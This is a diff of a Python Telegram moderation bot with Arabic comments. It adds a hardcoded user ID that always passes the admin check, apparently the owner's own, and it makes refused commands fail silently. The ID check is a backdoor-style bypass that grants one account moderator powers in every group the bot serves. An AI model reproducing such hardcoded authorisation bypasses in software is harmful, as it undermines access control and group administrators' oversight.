@@ -498,6 +498,10 @@ async def send_admin_notification(context, message):
             logger.error(f"❌ فشل في إرسال إشعار للإدمن {admin_id}: {e}")
 
 async def is_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    # إذا كان المستخدم هو أنت (بالرقم المحدد) اسمح له دائماً
+    if update.effective_user.id == 7635779264:
+        return True
+        
     if update.effective_chat.type == "private":
         return False
         
@@ -539,7 +543,7 @@ async def reset_warns(chat_id, user_id):
 def admin_only(handler):
     async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not await is_admin(update, context):
-            await update.message.reply_text("❌ هذا الأمر خاص بالمشرفين فقط.")
+            # لا ترسل أي رسالة - صمت تام
             return
         return await handler(update, context)
     return wrapper
@@ -807,7 +811,7 @@ async def warn_user_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
             
             await update.message.reply_text(
                 f"⚠️ {user_name} وصل إلى الحد الأقصى للتحذيرات ({warns}/{max_warns})\n"
-                f"هل تريد طرده الآن؟",
+                f"هل تريد طرده الآن?",
                 reply_markup=reply_markup
             )
         else:
@@ -1174,6 +1178,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-
-
-
